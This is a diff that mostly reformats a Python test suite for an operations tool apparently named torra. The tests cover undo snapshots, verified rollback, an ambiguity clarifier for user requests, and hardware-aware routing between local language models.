         second = generator.for_step(Step("edit2", touches=[str(target)]))
         assert second and second[0].snapshot is not None
 
-    def test_a_step_whose_snapshot_was_skipped_is_reported_uncovered(
-            self, tmp_path: Path) -> None:
+    def test_a_step_whose_snapshot_was_skipped_is_reported_uncovered(self, tmp_path: Path) -> None:
         """`touches` alone used to count as covered, even when the file was too big to
         snapshot or was a directory, so the plan advertised an undo that did not exist."""
         big = tmp_path / "big.bin"
@@ -1003,8 +1096,11 @@ class TestUndoGeneration:
         small = tmp_path / "small.txt"
         small.write_text("ok", encoding="utf-8")
         generator = UndoGenerator(shadow_dir=tmp_path / "s", max_shadow_bytes=10)
-        steps = [Step("big", touches=[str(big)]), Step("dir", touches=[str(tmp_path)]),
-                 Step("small", touches=[str(small)])]
+        steps = [
+            Step("big", touches=[str(big)]),
+            Step("dir", touches=[str(tmp_path)]),
+            Step("small", touches=[str(small)]),
+        ]
         for step in steps:
             generator.for_step(step)
 
@@ -1066,14 +1162,17 @@ class TestUndoGeneration:
     def _aged(self, path: Path, seconds: float) -> None:
         import os
         import time
+
         old = time.time() - seconds
         os.utime(path, (old, old))
 
     def test_a_uuid_named_dir_whose_owner_file_names_a_live_pid_is_never_reaped(
-            self, tmp_path: Path) -> None:
+        self, tmp_path: Path
+    ) -> None:
         """A TUI tab's shadow dir is named by session uuid; `torra-shadow-3f2a...`
         was read as pid 3 by the old pattern, so an idle tab could lose snapshots."""
         import os
+
         live = tmp_path / "torra-shadow-3f2a9c0d11"
         live.mkdir()
         (tmp_path / "torra-shadow-3f2a9c0d11.owner").write_text(str(os.getpid()), encoding="utf-8")
@@ -1085,6 +1184,7 @@ class TestUndoGeneration:
 
     def test_a_uuid_named_dir_whose_owner_is_dead_is_reaped(self, tmp_path: Path) -> None:
         import os
+
         dead_pid = 999999
         while UndoGenerator._pid_alive(dead_pid) and dead_pid > 2:
             dead_pid -= 1
@@ -1099,6 +1199,7 @@ class TestUndoGeneration:
 
     def test_an_ownerless_uuid_dir_is_left_a_week_then_reaped(self, tmp_path: Path) -> None:
         import os
+
         young = tmp_path / "torra-shadow-aaaa1111"
         old = tmp_path / "torra-shadow-bbbb2222"
         for d in (young, old):
@@ -1112,6 +1213,7 @@ class TestUndoGeneration:
 
     def test_every_shadow_dir_records_its_owner_even_after_cleanup(self, tmp_path: Path) -> None:
         import os
+
         generator = UndoGenerator(shadow_dir=tmp_path / "s")
         owner = tmp_path / "s.owner"
         assert owner.read_text(encoding="utf-8") == str(os.getpid())
@@ -1132,8 +1234,7 @@ class TestCaptureRemoteFile:
         assert generator.capture_remote_file("/etc/nginx/nginx.conf") is None
         assert any("no executor configured" in s for s in generator.skipped)
 
-    def test_present_case_snapshots_and_restores_byte_for_byte(
-            self, tmp_path: Path) -> None:
+    def test_present_case_snapshots_and_restores_byte_for_byte(self, tmp_path: Path) -> None:
         remote: dict[str, str] = {"/etc/nginx/nginx.conf": "original\n"}
 
         def fake_runner(command: str, cwd: str | None, timeout: float | None) -> str:
@@ -1141,9 +1242,11 @@ class TestCaptureRemoteFile:
                 return "yes" if "/etc/nginx/nginx.conf" in remote else "no"
             if command.startswith("base64 -w0"):
                 import base64 as b64
+
                 return b64.b64encode(remote["/etc/nginx/nginx.conf"].encode("utf-8")).decode()
             if "base64 -d" in command:
                 import base64
+
                 encoded = command.split("echo ", 1)[1].split(" |", 1)[0].strip("'")
                 remote["/etc/nginx/nginx.conf"] = base64.b64decode(encoded).decode("utf-8")
                 return ""
@@ -1161,10 +1264,12 @@ class TestCaptureRemoteFile:
         assert _verify(action) is True
 
     def test_restore_keeps_a_trailing_newline_and_bytes_that_are_not_utf8(
-            self, tmp_path: Path) -> None:
+        self, tmp_path: Path
+    ) -> None:
         """The real runner strips its output, so a `cat` read dropped the trailing newline and
         the restore still verified, against content that was already wrong."""
         import base64
+
         path = "/etc/app/blob.bin"
         original = b"line one\nline two\n\xff\xfe\x00tail\n"
         remote = {path: original}
@@ -1212,10 +1317,10 @@ class TestCaptureRemoteFile:
         assert "/tmp/new.conf" not in remote
         assert _verify(action) is True
 
-    def test_none_when_the_runner_fails_outright_not_a_broken_undo(
-            self, tmp_path: Path) -> None:
+    def test_none_when_the_runner_fails_outright_not_a_broken_undo(self, tmp_path: Path) -> None:
         """Never a fabricated or best-effort undo -- a push step this
         happens to is honestly 'uncovered', the same as dd/mkfs."""
+
         def always_fails(command: str, cwd: str | None, timeout: float | None) -> str:
             raise RuntimeError("host unreachable")
 
@@ -1223,8 +1328,7 @@ class TestCaptureRemoteFile:
         assert generator.capture_remote_file("/etc/nginx/nginx.conf") is None
         assert any("existence check failed" in s for s in generator.skipped)
 
-    def test_for_step_wires_remote_push_kind_to_capture_remote_file(
-            self, tmp_path: Path) -> None:
+    def test_for_step_wires_remote_push_kind_to_capture_remote_file(self, tmp_path: Path) -> None:
         def fake_runner(command: str, cwd: str | None, timeout: float | None) -> str:
             if command.startswith("test -e"):
                 return "no"
@@ -1243,8 +1347,9 @@ class TestCaptureRemoteFile:
         def must_not_be_called(command: str, cwd: str | None, timeout: float | None) -> str:
             raise AssertionError("an ordinary step must never touch the executor runner")
 
-        generator = UndoGenerator(shadow_dir=tmp_path / "shadow",
-                                  executor_runner=must_not_be_called)
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "shadow", executor_runner=must_not_be_called
+        )
         actions = generator.for_step(Step("edit", command="echo hi"))
         assert actions == []
 
@@ -1274,15 +1379,18 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         not distinguish "never existed" from "loaded and stopped", which
         is exactly the ambiguity _systemctl_scope's own docstring
         describes), not a crash."""
-        assert UndoGenerator._systemctl_scope("definitely-not-a-real-unit.service") \
-            in ("user", "system")
+        assert UndoGenerator._systemctl_scope("definitely-not-a-real-unit.service") in (
+            "user",
+            "system",
+        )
         generator = UndoGenerator(shadow_dir=Path(tempfile.mkdtemp()))
         state = generator._systemctl_state("definitely-not-a-real-unit.service")
         assert state, "must return a real status string, not raise"
 
     def test_the_real_systemctl_state_probe_degrades_to_unknown_on_a_real_failure(
-            self, monkeypatch) -> None:
-        """"unknown" is the fallback for when systemctl itself cannot be
+        self, monkeypatch
+    ) -> None:
+        """ "unknown" is the fallback for when systemctl itself cannot be
         invoked at all (binary missing, timeout) -- not for an ordinary
         "unit doesn't exist" miss, which still returns a real status."""
         generator = UndoGenerator(shadow_dir=Path(tempfile.mkdtemp()))
@@ -1332,13 +1440,15 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         assert calls == [], "a cached probe result must not shell out again"
 
     def test_reflink_probe_is_false_when_cp_is_unavailable(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         generator = UndoGenerator(shadow_dir=tmp_path / "s")
         monkeypatch.setattr("shutil.which", lambda name: None)
         assert generator._probe_reflink() is False
 
     def test_copy_falls_back_to_a_byte_copy_when_reflink_is_unsupported(
-            self, tmp_path: Path) -> None:
+        self, tmp_path: Path
+    ) -> None:
         source = tmp_path / "src.txt"
         source.write_text("content", encoding="utf-8")
         dest = tmp_path / "dst.txt"
@@ -1351,7 +1461,8 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         assert dest.read_text(encoding="utf-8") == "content"
 
     def test_copy_uses_reflink_when_the_probe_reports_it_works(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         """This filesystem (ext4, per HANDOFF §6.5) doesn't really support
         --reflink=always -- forcing the probe result is what exercises the
         success branch _copy would take on btrfs/xfs without needing one."""
@@ -1364,8 +1475,10 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         def fake_run(cmd, **kwargs):
             assert cmd[:2] == ["cp", "--reflink=always"]
             dest.write_bytes(source.read_bytes())
+
             class Result:
                 returncode = 0
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
@@ -1375,7 +1488,8 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         assert generator.reflink_copies == 1
 
     def test_capture_file_records_an_error_when_the_shadow_copy_fails(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         target = tmp_path / "app.conf"
         target.write_text("x", encoding="utf-8")
         generator = UndoGenerator(shadow_dir=tmp_path / "s")
@@ -1387,8 +1501,7 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         assert generator.capture_file(target) is None
         assert any("shadow copy failed" in s for s in generator.skipped)
 
-    def test_capture_mkdir_declines_when_the_directory_already_exists(
-            self, tmp_path: Path) -> None:
+    def test_capture_mkdir_declines_when_the_directory_already_exists(self, tmp_path: Path) -> None:
         """Only worth an undo when the step is the one creating it -- a
         directory that already exists is not this step's to remove."""
         target = tmp_path / "already-there"
@@ -1396,38 +1509,39 @@ class TestUndoGeneratorRealProbesAndFailureEdges:
         generator = UndoGenerator(shadow_dir=tmp_path / "s")
         assert generator.capture_mkdir(str(target)) is None
 
-    def test_for_step_derives_a_service_undo_from_a_systemctl_command(
-            self, tmp_path: Path) -> None:
+    def test_for_step_derives_a_service_undo_from_a_systemctl_command(self, tmp_path: Path) -> None:
         """Found gap: TestUndoGeneration's service test calls
         capture_service() directly -- nothing exercised SERVICE_PATTERN's
         match inside for_step() itself."""
-        generator = UndoGenerator(shadow_dir=tmp_path / "s",
-                                  service_probe=lambda unit: "active",
-                                  scope_probe=lambda unit: "system")
-        actions = generator.for_step(
-            Step("restart", command="sudo systemctl restart nginx"))
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "s",
+            service_probe=lambda unit: "active",
+            scope_probe=lambda unit: "system",
+        )
+        actions = generator.for_step(Step("restart", command="sudo systemctl restart nginx"))
         assert len(actions) == 1
         snapshot = actions[0].snapshot
         assert snapshot is not None
         assert snapshot.target == "nginx"
 
     def test_for_step_marks_a_package_removal_as_uncovered_not_inverted(
-            self, tmp_path: Path) -> None:
+        self, tmp_path: Path
+    ) -> None:
         """apt install gets an undo (test_package_undo_is_unsafe_by_design);
         apt remove/purge cannot be safely auto-inverted (what was removed
         may have had its own config already gone) and must not pretend
         otherwise -- named uncovered instead."""
-        generator = UndoGenerator(shadow_dir=tmp_path / "s",
-                                  package_probe=lambda: {"curl"})
-        actions = generator.for_step(
-            Step("cleanup", command="sudo apt remove --yes nginx"))
+        generator = UndoGenerator(shadow_dir=tmp_path / "s", package_probe=lambda: {"curl"})
+        actions = generator.for_step(Step("cleanup", command="sudo apt remove --yes nginx"))
         assert actions == []
         assert any("cannot be auto-inverted" in s for s in generator.skipped)
 
     def test_a_captured_packages_snapshot_serializes_its_payload_sorted(
-            self, tmp_path: Path) -> None:
-        generator = UndoGenerator(shadow_dir=tmp_path / "shadow",
-                                  package_probe=lambda: {"zeta", "alpha", "mid"})
+        self, tmp_path: Path
+    ) -> None:
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "shadow", package_probe=lambda: {"zeta", "alpha", "mid"}
+        )
         action = generator.capture_packages("nginx")
         assert action.snapshot is not None
         assert action.snapshot.to_dict()["payload"] == ["alpha", "mid", "zeta"]
@@ -1457,12 +1571,12 @@ class TestUndoGeneratorRemainingEdges:
     """
 
     def test_snapshot_to_dict_sorts_a_set_payload(self) -> None:
-        snap = Snapshot(SnapshotKind.PACKAGE_SET, "pkgs",
-                        payload={"zeta", "alpha", "mid"})
+        snap = Snapshot(SnapshotKind.PACKAGE_SET, "pkgs", payload={"zeta", "alpha", "mid"})
         assert snap.to_dict()["payload"] == ["alpha", "mid", "zeta"]
 
     def test_pid_alive_treats_permission_denied_as_alive(self, monkeypatch) -> None:
         """A pid we're not allowed to signal still definitely exists."""
+
         def fake_kill(pid: int, sig: int) -> None:
             raise PermissionError("not ours to signal")
 
@@ -1477,7 +1591,8 @@ class TestUndoGeneratorRemainingEdges:
         assert UndoGenerator._pid_alive(123456) is False
 
     def test_reap_stale_shadows_returns_quietly_when_the_parent_cannot_be_listed(
-            self, tmp_path: Path) -> None:
+        self, tmp_path: Path
+    ) -> None:
         """A real permission failure (not mocked) on the directory
         _reap_stale_shadows scans -- must skip reaping this round, not
         crash __init__. is_dir() on `parent` itself only needs traversal
@@ -1493,22 +1608,23 @@ class TestUndoGeneratorRemainingEdges:
         finally:
             os.chmod(parent, 0o755)
 
-    def test_the_real_systemctl_scope_probe_recognizes_user_scope(
-            self, monkeypatch) -> None:
+    def test_the_real_systemctl_scope_probe_recognizes_user_scope(self, monkeypatch) -> None:
         """test_the_real_systemctl_scope_probe_does_not_crash only ever
         resolves this machine's real units, which are all "system" --
         nothing exercises the "user" return itself."""
+
         def fake_run(cmd, **kwargs):
             assert cmd[:2] == ["systemctl", "--user"]
+
             class Result:
                 stdout = "LoadState=loaded\n"
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
         assert UndoGenerator._systemctl_scope("some.service") == "user"
 
-    def test_the_real_dpkg_probe_returns_empty_on_a_real_failure(
-            self, monkeypatch) -> None:
+    def test_the_real_dpkg_probe_returns_empty_on_a_real_failure(self, monkeypatch) -> None:
         def broken_run(cmd, **kwargs):
             raise FileNotFoundError("dpkg-query not found")
 
@@ -1516,7 +1632,8 @@ class TestUndoGeneratorRemainingEdges:
         assert UndoGenerator._dpkg_set() == set()
 
     def test_reflink_probe_is_false_when_the_probe_subprocess_itself_fails(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         """Distinct from test_reflink_probe_is_false_when_cp_is_unavailable:
         `cp` is genuinely on PATH here, it's the probe invocation itself
         that blows up (killed, vanished mid-run, etc.)."""
@@ -1529,7 +1646,8 @@ class TestUndoGeneratorRemainingEdges:
         assert generator._probe_reflink() is False
 
     def test_copy_falls_back_to_a_byte_copy_when_the_reflink_subprocess_itself_fails(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         """Distinct from test_copy_falls_back_to_a_byte_copy_when_reflink_is_unsupported
         (probe says no) and the returncode-!=0 path exercised by the
         success test's mirror image: here the reflink subprocess call
@@ -1553,7 +1671,8 @@ class TestUndoGeneratorRemainingEdges:
         assert any("reflink copy of" in s for s in generator.skipped)
 
     def test_undo_packages_removes_only_the_packages_added_since_the_snapshot(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         """Every existing capture_packages test only ever builds the
         UndoAction -- nothing calls .undo() itself, so the closure that
         diffs against the snapshot and issues the real removal never ran."""
@@ -1570,8 +1689,10 @@ class TestUndoGeneratorRemainingEdges:
 
         def fake_run(cmd, **kwargs):
             recorded.append(cmd)
+
             class Result:
                 returncode = 0
+
             return Result()
 
         monkeypatch.setattr(subprocess, "run", fake_run)
@@ -1581,9 +1702,9 @@ class TestUndoGeneratorRemainingEdges:
         assert set(recorded[0][3:]) == {"nginx", "nginx-common"}
 
     def test_undo_packages_issues_no_removal_when_nothing_new_was_added(
-            self, tmp_path: Path, monkeypatch) -> None:
-        generator = UndoGenerator(shadow_dir=tmp_path / "s",
-                                  package_probe=lambda: {"curl"})
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
+        generator = UndoGenerator(shadow_dir=tmp_path / "s", package_probe=lambda: {"curl"})
         action = generator.capture_packages("nginx")
 
         calls = []
@@ -1661,8 +1782,9 @@ class TestVerifiedRollback:
 
     def test_a_raising_verifier_counts_as_unverified(self) -> None:
         rollback = VerifiedRollback(stop_on_unverified=False)
-        rollback.add("r", lambda: None,
-                     verify=lambda: (_ for _ in ()).throw(OSError("cannot stat")))
+        rollback.add(
+            "r", lambda: None, verify=lambda: (_ for _ in ()).throw(OSError("cannot stat"))
+        )
         report = rollback.rollback()
         assert report.results[0].status == "unverified"
         assert "OSError" in report.results[0].error
@@ -1706,8 +1828,9 @@ class TestVerifiedRollback:
     def test_an_approved_unsafe_undo_actually_runs(self) -> None:
         order = []
         rollback = VerifiedRollback(confirm_unsafe=lambda a: True)
-        rollback.add("drop the table", lambda: order.append("dropped"),
-                     safe=False, verify=lambda: True)
+        rollback.add(
+            "drop the table", lambda: order.append("dropped"), safe=False, verify=lambda: True
+        )
 
         report = rollback.rollback()
         assert order == ["dropped"]
@@ -1747,11 +1870,14 @@ class TestVerifiedRollback:
         `tests/test_pipeline.py::test_a_declared_safe_rollback_is_still_classified`
         for that end-to-end coverage."""
         target = tempfile.mkdtemp()
-        spec = TaskSpec.validate({
-            "task_id": "t", "request": "r",
-            "steps": [{"id": "s1", "run": "true"}],
-            "rollback": [{"run": f"rm -rf {target}", "description": "cleanup"}],
-        })
+        spec = TaskSpec.validate(
+            {
+                "task_id": "t",
+                "request": "r",
+                "steps": [{"id": "s1", "run": "true"}],
+                "rollback": [{"run": f"rm -rf {target}", "description": "cleanup"}],
+            }
+        )
         actions = spec.rollback_actions()
         assert len(actions) == 1
         description, command, undo, declared_safe = actions[0]
@@ -1770,11 +1896,14 @@ class TestVerifiedRollback:
             seen["cwd"], seen["timeout"] = cwd, timeout
             return "ok"
 
-        spec = TaskSpec.validate({
-            "task_id": "t", "request": "r",
-            "steps": [{"id": "s1", "run": "true"}],
-            "rollback": [{"run": "git reset --hard", "cwd": "/srv/app", "timeout": 30}],
-        })
+        spec = TaskSpec.validate(
+            {
+                "task_id": "t",
+                "request": "r",
+                "steps": [{"id": "s1", "run": "true"}],
+                "rollback": [{"run": "git reset --hard", "cwd": "/srv/app", "timeout": 30}],
+            }
+        )
         _description, _command, undo, _safe = spec.rollback_actions(runner=runner)[0]
         undo()
 
@@ -1794,12 +1923,24 @@ class TestClarifier:
     """
 
     AMBIGUOUS = [
-        "fix it", "clean up this", "make the api faster", "delete all the logs",
-        "restart the server", "roll back the deployment", "deploy",
-        "reset the postgres volume", "free up some disk", "tidy up the box",
-        "quiesce the writes", "drain the queue", "throttle the neighbour",
-        "consolidate the dirs", "reticulate the splines", "unwedge the thing",
-        "get the api ready for production", "migrate to the new setup",
+        "fix it",
+        "clean up this",
+        "make the api faster",
+        "delete all the logs",
+        "restart the server",
+        "roll back the deployment",
+        "deploy",
+        "reset the postgres volume",
+        "free up some disk",
+        "tidy up the box",
+        "quiesce the writes",
+        "drain the queue",
+        "throttle the neighbour",
+        "consolidate the dirs",
+        "reticulate the splines",
+        "unwedge the thing",
+        "get the api ready for production",
+        "migrate to the new setup",
     ]
 
     SPECIFIC = [
@@ -1822,15 +1963,15 @@ class TestClarifier:
 
     def test_low_false_positives(self) -> None:
         clarifier = Clarifier()
-        blocked = [(r, [a.code for a in clarifier.detect(r)])
-                   for r in self.SPECIFIC if clarifier.detect(r)]
+        blocked = [
+            (r, [a.code for a in clarifier.detect(r)]) for r in self.SPECIFIC if clarifier.detect(r)
+        ]
         assert len(blocked) <= 1, blocked
 
     def test_it_is_verb_agnostic(self) -> None:
         """Invented jargon cannot slip past, because there is no verb list."""
         clarifier = Clarifier()
-        for request in ("defenestrate the daemon", "frobnicate the widget",
-                        "yeet the thing"):
+        for request in ("defenestrate the daemon", "frobnicate the widget", "yeet the thing"):
             codes = {a.code for a in clarifier.detect(request)}
             assert "no_target" in codes, f"{request!r} -> {codes}"
 
@@ -1843,15 +1984,14 @@ class TestClarifier:
 
     def test_destructive_needs_a_target_or_a_filter(self) -> None:
         clarifier = Clarifier()
-        assert any(a.code == "no_backup_plan"
-                   for a in clarifier.detect("wipe the staging data"))
+        assert any(a.code == "no_backup_plan" for a in clarifier.detect("wipe the staging data"))
         assert clarifier.detect("remove docker images older than 30 days") == []
         assert Clarifier(strict_destructive=True).detect(
-            "remove /tmp/build-cache-2024 and nothing else")
+            "remove /tmp/build-cache-2024 and nothing else"
+        )
 
     def test_deploy_without_an_environment_is_flagged(self) -> None:
-        assert any(a.code == "no_environment"
-                   for a in Clarifier().detect("deploy the api"))
+        assert any(a.code == "no_environment" for a in Clarifier().detect("deploy the api"))
 
     def test_deploy_to_localhost_is_not_flagged(self) -> None:
         """Found in a full-file audit: the anchor pattern recognizes
@@ -1872,8 +2012,7 @@ class TestClarifier:
         handle" and were silently treated as having named an environment,
         even though neither names one at all."""
         clarifier = Clarifier()
-        for request in ("deploy the api to fix the bug",
-                        "deploy the api to handle more load"):
+        for request in ("deploy the api to fix the bug", "deploy the api to handle more load"):
             codes = {a.code for a in clarifier.detect(request)}
             assert "no_environment" in codes, request
 
@@ -1898,8 +2037,7 @@ class TestClarifier:
     def test_a_request_with_no_dangling_pronoun_is_not_flagged(self) -> None:
         """`_has_antecedent`'s own no-match short circuit -- most specific
         requests never even mention "it"/"this"/"that"."""
-        codes = {a.code for a in Clarifier().detect(
-            "remove docker images older than 30 days")}
+        codes = {a.code for a in Clarifier().detect("remove docker images older than 30 days")}
         assert "dangling_pronoun" not in codes
 
     def test_has_antecedent_defaults_true_with_no_pronoun_present(self) -> None:
@@ -1910,8 +2048,9 @@ class TestClarifier:
         assert Clarifier()._has_antecedent("remove docker images") is True
 
     def test_open_timing_with_no_concrete_schedule_is_flagged(self) -> None:
-        codes = {a.code for a in Clarifier().detect(
-            "restart ollama.service on popos-01 sometime soon")}
+        codes = {
+            a.code for a in Clarifier().detect("restart ollama.service on popos-01 sometime soon")
+        }
         assert "no_schedule" in codes
 
     def test_detect_on_an_empty_request_reports_it_as_empty(self) -> None:
@@ -1919,8 +2058,7 @@ class TestClarifier:
         assert len(ambiguities) == 1
         assert ambiguities[0].code == "empty"
 
-    def test_explain_renders_anchors_filter_and_verdict_for_a_blocked_request(
-            self) -> None:
+    def test_explain_renders_anchors_filter_and_verdict_for_a_blocked_request(self) -> None:
         text = Clarifier().explain("fix it")
         assert "anchors:" in text
         assert "filter:" in text
@@ -1954,15 +2092,17 @@ class TestRouting:
 
     def test_the_routing_contract(self) -> None:
         router = ModelRouter()
-        wrong = [(r, router.select(r).model, want)
-                 for r, want in self.CONTRACT if router.select(r).model != want]
+        wrong = [
+            (r, router.select(r).model, want)
+            for r, want in self.CONTRACT
+            if router.select(r).model != want
+        ]
         assert not wrong, wrong
 
     def test_the_earliest_rule_owns_the_intent(self) -> None:
-        """"review the deploy script" beat term frequency twice before this."""
+        """ "review the deploy script" beat term frequency twice before this."""
         router = ModelRouter()
-        assert router.select("review the deploy script before we ship it").rule \
-            == "analyze"
+        assert router.select("review the deploy script before we ship it").rule == "analyze"
         assert router.select("deploy the reviewed script").rule == "deploy"
 
     def test_it_never_routes_to_an_absent_model(self) -> None:
@@ -2017,6 +2157,7 @@ class TestRouting:
         2026-08-28 onto the post-Qwen-removal names (gpt-oss:20b /
         devstral-small-2:24b) -- it exercises the same mechanism, not a
         re-verification of the original qwen3:32b/qwen3-coder:30b finding."""
+
         class EverythingButAmbiguousFallbackFits:
             """Both devstral and the larger devstral-small-2 fit -- proves this
             deliberately skips _pick_replacement()'s "largest fitting"
@@ -2030,7 +2171,8 @@ class TestRouting:
 
         router = ModelRouter(
             available=["gpt-oss:20b", "devstral:24b", "devstral-small-2:24b"],
-            accelerator=EverythingButAmbiguousFallbackFits())
+            accelerator=EverythingButAmbiguousFallbackFits(),
+        )
         choice = router.select("storage issues on paramostorage", ambiguous=True)
         assert choice.model == "devstral:24b"
 
@@ -2058,7 +2200,8 @@ class TestRouting:
         this exercises the normalization directly with its own rule.)"""
         router = ModelRouter(
             rules=[("deploy", r"\bdeploy\b", "devstral", "n/a")],
-            available=["devstral:latest", "qwen3:32b"])
+            available=["devstral:latest", "qwen3:32b"],
+        )
         assert router.select("deploy the api to staging").model == "devstral"
 
     def test_a_downgrade_never_re_offers_the_model_that_just_failed(self) -> None:
@@ -2069,6 +2212,7 @@ class TestRouting:
         "downgraded from devstral because ..." resolved right back to
         devstral. With nothing runnable, the least-bad choice is the
         smallest model actually pulled, not a repeat of the failed one."""
+
         class NothingFits:
             gpu = True
             free_vram_mb = 5660
@@ -2077,8 +2221,8 @@ class TestRouting:
                 return False
 
         router = ModelRouter(
-            available=["devstral", "qwen3:32b", "qwen3:8b"],
-            accelerator=NothingFits())
+            available=["devstral", "qwen3:32b", "qwen3:8b"], accelerator=NothingFits()
+        )
         choice = router.select("what files take up lots of space")
         assert choice.model != "devstral"
         assert choice.model == "qwen3:8b"
@@ -2094,6 +2238,7 @@ class TestRouting:
         can't hold a chat/plan conversation on an embedding-only model;
         routing a real request onto it is a hang or a broken response, not
         a working answer at reduced quality."""
+
         class TightVram:
             gpu = True
             free_vram_mb = 3000
@@ -2103,9 +2248,11 @@ class TestRouting:
 
         available = ["devstral", "qwen3:32b", "qwen3:8b", "nomic-embed-text:latest"]
         router = ModelRouter(
-            available=available, accelerator=TightVram(),
+            available=available,
+            accelerator=TightVram(),
             model_params_b={"nomic-embed-text:latest": 0.137, "qwen3:8b": 8.0},
-            model_chat_capable={"nomic-embed-text:latest": False})
+            model_chat_capable={"nomic-embed-text:latest": False},
+        )
 
         choice = router.select("what files take up lots of space")
 
@@ -2116,7 +2263,8 @@ class TestRouting:
         router = ModelRouter(
             rules=[("quick", r"\bcheck\b", "nomic-embed-text:latest", "n/a")],
             available=["nomic-embed-text:latest"],
-            model_chat_capable={"nomic-embed-text:latest": False})
+            model_chat_capable={"nomic-embed-text:latest": False},
+        )
         assert router.score("check the status") == []
 
 
@@ -2197,6 +2345,7 @@ class TestDecisionLog:
 
     def test_a_broken_sink_does_not_break_the_run(self) -> None:
         """The TUI subscribes to this. A UI crash must not kill a deploy."""
+
         def exploding(_record) -> None:
             raise RuntimeError("ui died")
 
@@ -2216,10 +2365,12 @@ class TestHardwareAwareRouting:
 
     def _router(self, accelerator):
         from torra.gates import ModelRouter
+
         return ModelRouter(available=self.AVAILABLE, accelerator=accelerator)
 
     def test_a_big_gpu_gets_the_big_model(self) -> None:
         from torra.core import Accelerator
+
         router = self._router(Accelerator("cuda", "RTX 4090", 24564, 23000))
         assert router.select("debug why nginx keeps crashing").model == "gpt-oss:20b"
         assert router.select("deploy the api to staging").model == "devstral:24b"
@@ -2227,6 +2378,7 @@ class TestHardwareAwareRouting:
     def test_cpu_only_never_loads_a_32b_model(self) -> None:
         """The reported symptom: three times the thinking time, on CPU."""
         from torra.core import Accelerator
+
         router = self._router(Accelerator(kind="cpu", detail="no nvidia-smi"))
         choice = router.select("debug why nginx keeps crashing")
 
@@ -2236,6 +2388,7 @@ class TestHardwareAwareRouting:
 
     def test_a_small_card_gets_a_model_that_fits(self) -> None:
         from torra.core import Accelerator
+
         router = self._router(Accelerator("cuda", "GTX 1650", 4096, 3500))
         assert router.select("debug why nginx keeps crashing").model == "phi3"
         assert router.select("deploy the api to staging").model == "phi3", (
@@ -2245,6 +2398,7 @@ class TestHardwareAwareRouting:
     def test_a_nameless_size_is_looked_up_not_assumed(self) -> None:
         """`devstral` parses as 0b and would look like it fits anywhere."""
         from torra.core import Accelerator
+
         router = self._router(Accelerator("cuda", "GTX 1650", 4096, 3500))
         assert router._params_b("devstral") == 24.0
         assert router.runnable("devstral") is False
@@ -2253,6 +2407,7 @@ class TestHardwareAwareRouting:
     def test_no_accelerator_information_changes_nothing(self) -> None:
         """Routing must behave exactly as before when hardware is unknown."""
         from torra.gates import ModelRouter
+
         plain = ModelRouter(available=self.AVAILABLE)
         assert plain.select("debug why nginx keeps crashing").model == "gpt-oss:20b"
         assert plain.downgrades == []
@@ -2281,6 +2436,7 @@ class TestServiceStateHelpers:
 
     def test_restore_verbs_cover_each_before_and_now_combination(self) -> None:
         from torra.gates.service_state import restore_verbs
+
         assert restore_verbs("disabled", "active", "enabled") == ["enable", "start"]
         assert restore_verbs("enabled", "inactive", "disabled") == ["disable", "stop"]
         assert restore_verbs("masked", "active", "enabled") == ["unmask", "enable", "start"]
@@ -2293,6 +2449,7 @@ class TestServiceStateHelpers:
 
     def test_the_query_runs_in_the_units_own_scope(self, monkeypatch) -> None:
         from torra.gates.service_state import systemctl_query
+
         seen: list[list[str]] = []
 
         class Out:
@@ -2302,15 +2459,22 @@ class TestServiceStateHelpers:
 
         assert systemctl_query("is-active", "u.service", "user") == "active"
         assert systemctl_query("is-enabled", "u.service", "system") == "active"
-        assert seen == [["systemctl", "--user", "is-active", "u.service"],
-                        ["systemctl", "is-enabled", "u.service"]]
+        assert seen == [
+            ["systemctl", "--user", "is-active", "u.service"],
+            ["systemctl", "is-enabled", "u.service"],
+        ]
 
     def test_an_undo_is_not_verified_when_the_state_could_never_be_read(
-            self, tmp_path: Path, monkeypatch) -> None:
+        self, tmp_path: Path, monkeypatch
+    ) -> None:
         """`unknown == unknown` used to pass, so a failed undo read as verified."""
         monkeypatch.setattr(subprocess, "run", lambda cmd, **kw: None)
-        generator = UndoGenerator(shadow_dir=tmp_path / "s", service_probe=lambda u: "unknown",
-                                  enabled_probe=lambda u: "unknown", scope_probe=lambda u: "system")
+        generator = UndoGenerator(
+            shadow_dir=tmp_path / "s",
+            service_probe=lambda u: "unknown",
+            enabled_probe=lambda u: "unknown",
+            scope_probe=lambda u: "system",
+        )
         action = generator.capture_service("nginx")
 
         assert action.verify is not None and action.verify() is False
